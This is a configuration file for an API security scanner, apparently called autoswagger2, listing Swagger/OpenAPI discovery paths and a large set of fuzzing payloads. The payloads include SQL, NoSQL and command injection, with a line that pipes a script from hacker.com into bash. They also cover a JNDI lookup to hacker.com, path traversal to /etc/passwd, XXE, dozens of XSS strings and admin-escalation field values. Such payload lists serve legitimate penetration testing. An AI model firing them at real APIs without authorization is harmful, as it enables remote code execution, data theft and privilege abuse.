# autoswagger2/utils/config.py
# Contains all global constants and configurations.

__version__ = "2.0.3"

# --- IMPROVEMENT: Expanded discovery paths based on Nuclei templates ---
SWAGGER_UI_PATHS = sorted({
    "/", "/apidocs/", "/swagger/ui/index", "/swagger/index.html", "/swagger-ui.html",
    "/swagger-ui/index.html", "/swagger/swagger-ui.html", "/api/swagger-ui.html",
    "/api_docs", "/api/index.html", "/api/doc", "/api/docs/", "/api/swagger/index.html",
    "/api/swagger/swagger-ui.html", "/api/swagger-ui/api-docs", "/api/api-docs",
    "/api/apidocs", "/api/swagger", "/api/swagger/static/index.html",
    "/api/swagger-resources", "/api/swagger-resources/restservices/v2/api-docs",
    "/api/__swagger__/", "/api/_swagger_/", "/docu", "/docs", "/swagger", "/api-doc",
    "/doc/", "/webjars/swagger-ui/index.html", "/3.0.0/swagger-ui.html",
    "/MobiControl/api/docs/index/index.html", "/Swagger", "/Swagger/", "/Swagger/index.html",
    "/V2/api-docs/ui", "/admin/swagger-ui/index.html", "/api-doc/", "/api-docs/",
    "/api-docs/ui/", "/api-docs/v1/index.html", "/api-documentation/index.html",
    "/api/", "/api/api-docs", "/api/api-docs/index.html", "/api/api/",
    "/api/apidocs", "/api/config", "/api/doc", "/api/doc/", "/api/spec/", "/spec/",
    "/swagger-ui/swagger-ui.js", "/swagger/swagger-ui.js", "/swagger-ui.js",
    "/swagger/ui/swagger-ui.js", "/api/docs/index.html", "/api/help/swagger-console.html",
    "/api/swagger/ui/index", "/__swagger__/", "/_swagger_/",
    "/swagger-resources/configuration/security", "/swagger-resources/configuration/ui",
    "/swagger-ui/", "/swagger-ui/vendor", "/swagger/", "/swagger/api-docs/",
    "/swagger/dist/index.html", "/swagger/document", "/swagger/static/index.html",
    "/swaggerui/", "/swaggerui/index.html", "/v1/api-docs/", "/v1/api-docs/index.html",
    "/v1/swagger-ui.html", "/v3/api-docs/ui", "/webapi/index.html",
    "/webapi/swagger/index.html", "/webjars/springfox-swagger-ui/3.0.0/swagger-ui.html",
    "/webjars/swagger-ui/2.2.5/index.html",
    # UI Paths for OpenAPI 3.1
    "/v3.1/api-docs/ui", "/v3.1/swagger-ui.html",
    "/api/v3.1/swagger-ui.html", "/openapi3.1/swagger-ui.html",
    "/api/openapi3.1/swagger-ui.html", "/docs/openapi3.1/ui",
    # Paths from swagger-wordlist.txt & SecLists
    "/api", "/api-docs", "/api/docs", "/api/documentation", "/api/documentation/", "/api/help", "/api/help/",
    "/api-reference", "/api-reference/", "/api/spec", "/api-docs/index.html", "/apidocs/index.html",
    "/api/apidocs/index.html", "/api/swagger-ui/", "/api/swagger-ui/index.html", "/.well-known/openapi.html",
    "/swagger-resources", "/api-docs.html", "/api-docs/api-docs",
})

DIRECT_SPEC_PATHS = sorted({
    "/swagger.json", "/swagger.yaml", "/swagger.yml", "/api/swagger.json",
    "/api/swagger.yaml", "/api/swagger.yml", "/v1/swagger.json",
    "/v1/swagger.yaml", "/v1/swagger.yml", "/openapi.json",
    "/openapi.yaml", "/openapi.yml", "/api/openapi.json",
    "/api/openapi.yaml", "/api/openapi.yml", "/docs/swagger.json",
    "/docs/swagger.yaml", "/docs/openapi.json", "/docs/openapi.yaml",
    "/api-docs/swagger.json", "/api-docs/swagger.yaml",
    "/swagger/v1/swagger.json", "/swagger/v1/swagger.yaml",
    "/rest/swagger.json", "/rest/swagger.yaml", "/rest-api/swagger.json",
    "/swagger/v1/docs.json", "/api/swagger/docs.json",
    "/swagger/docs/v1.json", "/swagger/swagger.json", "/swagger/swagger.yaml",
    "/api-doc.json", "/api/spec/swagger.json", "/api/spec/swagger.yaml",
    "/api/v1/swagger-ui/swagger.json", "/api/v1/swagger-ui/swagger.yaml",
    "/api/swagger_doc.json", "/v2/swagger.json", "/v2/swagger.yaml",
    "/v3/swagger.json", "/v3/swagger.yaml", "/openapi2.json",
    "/openapi2.yaml", "/openapi2.yml", "/api/v3/openapi.json",
    "/api/v3/openapi.yaml", "/api/v3/openapi.yml", "/spec/swagger.json",
    "/spec/swagger.yaml", "/spec/openapi.json", "/spec/openapi.yaml",
    "/api-docs/swagger-ui.json", "/api-docs/swagger-ui.yaml",
    "/api-docs/openapi.json", "/api-docs/openapi.yaml",
    "/swagger-ui.json", "/swagger-ui.yaml",
    "/v2/api-docs", "/v3/api-docs",

    "/v3.1/api-docs", "/v3.1/openapi.json", "/v3.1/openapi.yaml", "/v3.1/openapi.yml",
    "/api/v3.1/openapi.json", "/api/v3.1/openapi.yaml", "/api/v3.1/openapi.yml",
    "/openapi3.1.json", "/openapi3.1.yaml", "/openapi3.1.yml",
    "/api/openapi3.1.json", "/api/openapi3.1.yaml", "/api/openapi3.1.yml",
    "/docs/openapi3.1.json", "/docs/openapi3.1.yaml",
    "/spec/openapi3.1.json", "/spec/openapi3.1.yaml",
    "/specs/openapi.json", "/specs/openapi.yaml",
    "/api-specs/openapi.json", "/api-specs/openapi.yaml",

    # swagger-ui-init.js paths (Express swagger-ui-express, etc.)
    "/swagger-ui-init.js", "/swagger-ui/swagger-ui-init.js", "/swagger/swagger-ui-init.js",
    "/api/swagger-ui-init.js", "/api/docs/swagger-ui-init.js", "/api/v1/docs/swagger-ui-init.js",
    "/docs/swagger-ui-init.js", "/v1/docs/swagger-ui-init.js",
    # Paths from swagger-wordlist.txt & SecLists
    "/api/api-docs/swagger.json", "/api/apidocs/swagger.json", "/api/api-docs/swagger.yaml", "/api/apidocs/swagger.yaml", "/api/doc.json",
    "/.well-known/openapi.json", "/.well-known/openapi.yaml", "/api-docs.json", "/api-docs.yaml", "/api-docs.yml",
    "/api.json", "/api.yaml", "/api.yml", "/api/v1/api-docs", "/api/v2/api-docs", "/api/v3/api-docs",
    "/api/v1/openapi.json", "/api/v2/openapi.json", "/api/v1/openapi.yaml", "/api/v2/openapi.yaml",
    "/api/v1/swagger.json", "/api/v2/swagger.json", "/api/v1/swagger.yaml", "/api/v2/swagger.yaml",
    "/api-docs/api-docs.json", "/api-merged.json",
})

# --- IMPROVEMENT: More creative and comprehensive test values ---
# Expanded with a wider range of payloads for injection, traversal, and edge cases.
TEST_VALUES = {
    "integer": [1, 0, -1, 100, 999999, 2147483647],
    "string": [
        # --- Common & Default ---
        "test", "admin", "1", "", "*",
        # --- Injection Payloads (SQL, NoSQL, Command, SSTI) ---
        "' OR 1=1--", "'; exec sp_xp_cmdshell 'whoami'--",
        "||'admin'--",
        "||(SELECT 'admin')",
        "1; SELECT pg_sleep(10)--",
        "{\"username\":{\"$ne\": \"\"}, \"password\":{\"$ne\": \"\"}}",
        "; ls -la", "| whoami", "`id`",
        "; curl http://hacker.com/shell.sh | bash", # OS Command Injection
        "{{7*7}}", "${7*7}}", "<%= 7*7 %>",
        "{{ 7 * 7 }}", # SSTI / Vue
        "\"$ne\": 1", "{\"query\": \"${gt: ''}\"}", "{\"username\": {\"$gt\": \"\"}}", # NoSQL Injections
        "${jndi:ldap://hacker.com/Exploit}", # Java JNDI RCE
        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}", # Fastjson Deserialization
        "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")", # Spring SpEL RCE
        # --- Traversal Tomcat ---
        "../..;/", "/..;/", "..;/",
        # --- Traversal & File Inclusion ---
        "../../../../etc/passwd", "../../../../../windows/system32/drivers/etc/hosts",
        "..%2f..%2f..%2fetc%2fpasswd", # Encoded Traversal
        "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
        "<iframe src=\"file:///etc/passwd\">test</iframe>", # XSS/LFI
        "<pd4ml:attachment src=\"/etc/passwd\" description=\"almond\" icon=\"Paperclip\"/>", # PDF Attachment LFI
        # --- XXE ---
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
        # --- XSS & HTML Payloads ---
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "<video change=\"alert(this.ssss)\">",
        "alert(this.qss)",
        "<body change=\"this.fssf\">",
        "abort=\"prompt(document.location.href",
        "&lt;script&gt;alert(1)&lt;/script&gt;", # HTML Encoded
        "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E", # Unicode Encoded
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # Hex Encoded
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E", # URL Encoded
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
        "<script>alert`1`</script>",
        "<a href=\"jav&#x09;ascript:alert(1)\">Cliquez ici</a>",
        "<script>let x = 'coo' + 'kie'; console.log(document[x]); window['al' + 'ert'](1);</script>",
        "</span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
        "<html>", "</html>", "<style>", "</style>", "<script>", "</script>",
        "<area draggable=\"true\" ondragstart=\"alert(1)\">test</area>",
        "<meter oncut=\"alert(1)\" contenteditable>test</meter>",
        "<input onchange=alert(1) value=xss>",
        "<main onmousedown=\"alert(1)\">test</main>",
        "<command oncontextmenu=\"alert(1)\">test</command>",
        "<samp onmousemove=\"alert(1)\">test</samp>",
        "<script onmousemove=\"alert(1)\">test</script>",
        "<iframe onmouseenter=\"alert(1)\">test</iframe>",
        "<keygen onmouseleave=\"alert(1)\">test</keygen>",
        "<hr id=x tabindex=1 onactivate=alert(1)></hr>",
        "<blockquote onbeforepaste=\"alert(1)\" contenteditable>test</blockquote>",
        "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>",
        "<html onbeforecut=\"alert(1)\" contenteditable>test</html>",
        "<select onchange=alert(1)><option>change me</option><option>XSS</option></select>",
        "<img2 onpointermove=alert(1)>XSS</img2>",
        "<span onclick=\"chrome://settings/\">",
        "<tr onpointerup=alert(1)>XSS</tr>",
        "<track onmouseleave=\"alert(1)\">test</track>",
        "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationend=\"alert(1)\"></plainte",
        "<style>@keyframes x{}</style><body style=\"animation-name:x\" onanimationstart=\"alert(1)\"></body>",
        "<strike onpointerover=alert(1)>XSS</strike>",
        "<style>:target {color:red;}</style><b id=x style=\"transition:color 1s\" ontransitionend=alert(1)></b>",
        "<svg><spacer onload=alert(1)></spacer></svg>",
        "<style>:target {transform: rotate(180deg);}</style><kbd id=x style=\"transition:transform 2s\" transform-origin: bottom left;\"",
        "<a onclick=\"bad\">", "<span onclick=\"\\\\:#chrome\">",
        "<link src=\"http://url.to.file.which/not.exist\">",
        "<a href=\"javascript:alert(1)\">",
        "<b onmouseover=alert('Wufff!')>click me!</b>",
        "<IMG SRC=j&#X41vascript:alert('test2')>",
        "<img src=\"http://url.to.file.which/not.exist\"/>",
        "<img onerror=alert(document.cookie);>",
        "document.cookie",
        "[1].find(alert)",
        "document['body'].innerHTML=",
        "document.getElementById('x').innerHTML=",
        "#<img src=x onerror=alert(1)>",
        "?search=<img src=x onerror=alert(1)>",
        "document.write('... USER_INPUT ...') ",
        "element.innerHTML = '... USER_INPUT ...' ",
        "$(\"#element\").html('... USER_INPUT ...')",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x onerror=alert(1)>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert&#x28;1&#x29>",
        "site.com/page#<img src=x onerror=alert(1)>",
        "site.com/page#javascript:alert(1)",
        "localStorage.setItem('test', '<img src=x onerror=alert(1)>');",
        "sessionStorage.setItem('test', '<img src=x onerror=alert(1)>');",
        "site.com/page?name=<div onmouseover='alert(1)'>",
        "site.com/page?name=</script><script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<svg/onload=alert(1)>",
        "<q/oncut=alert(1)>",
        "<div data-react-props=\"{'dangerouslySetInnerHTML':{'__html':'<img src=x onerror=alert(1)>'}}\">",
        "\\';alert(1)//", "';alert(1)//", "'-alert(1)-'", "\" onmouseover=\"alert(1)",
        "<script type=\"importmap\">{\"imports\": {\"x\": \"data:text/javascript,alert(1)\"}}</script>",
        "<div id=x></div><script>x.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>",
        "<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>",
        "<META HTTP-EQUIV=\"refresh\"\nCONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg\">",
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>",
        "<a href=\"javascript&colon;alert(1)\">Click</a>",
        "<a href=\"javascript&#58;alert(1)\">Click</a>",
        "<a href=\"javascript&#0058;alert(1)\">Click</a>",
        # --- Edge Cases & Fuzzing ---
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Data URI
        "null", "true", "false", "undefined",
        "test@example.com", "550e8400-e29b-41d4-a716-446655440000", # Email & UUID
        "A" * 1024, # Long string
        "你好", # Unicode
        "%00", "%0a", "%0d", # Control characters
        "'" , "\"", "<", ">", "&", # Special characters
    ],
    "boolean": [True, False],
    "number": [1.0, 0.0, -1.5, 999.99, 1.7976931348623157e+308],
    "base64": [
        # --- Common & Default ---
        "MQ==", # 1
        "YWRtaW4=", # admin
        # --- Auth-related Payloads ---
        "YWRtaW46YWRtaW4=", # admin:admin
        "dGVzdDE6MTIzNDU2", # test1:123456
        # --- Common Formats & Files ---
        "eyJ1c2VyIjogImFkbWluIiwgImlkIjogMTIzfQ==", # {"user": "admin", "id": 123}
        "L2V0Yy9wYXNzd2Q=", # /etc/passwd
        "UEsDBAoAAAAA", # PK.. zip file header
    ],
    "default": ["1", "test", True, "550e8400-e29b-41d4-a716-446655440000", "*"]
}

BOPLA_SENSITIVE_KEYS = {
    "isAdmin": [True, 1, "true"],
    "admin": [True, 1, "true"],
    "role": ["admin", "administrator"],
    "permission": ["all", "*", "true", 1],
    "is_admin": [True, 1, "true"],
    "isadmin": [True, 1, "true"],
    "user_role": ["admin", "administrator"],
    "account_type": ["premium", "admin"],
    "credits": [999999],
    "balance": [999999]
}

PAGINATION_KEYWORDS = ['limit', 'size', 'page', 'offset', 'max', 'count']
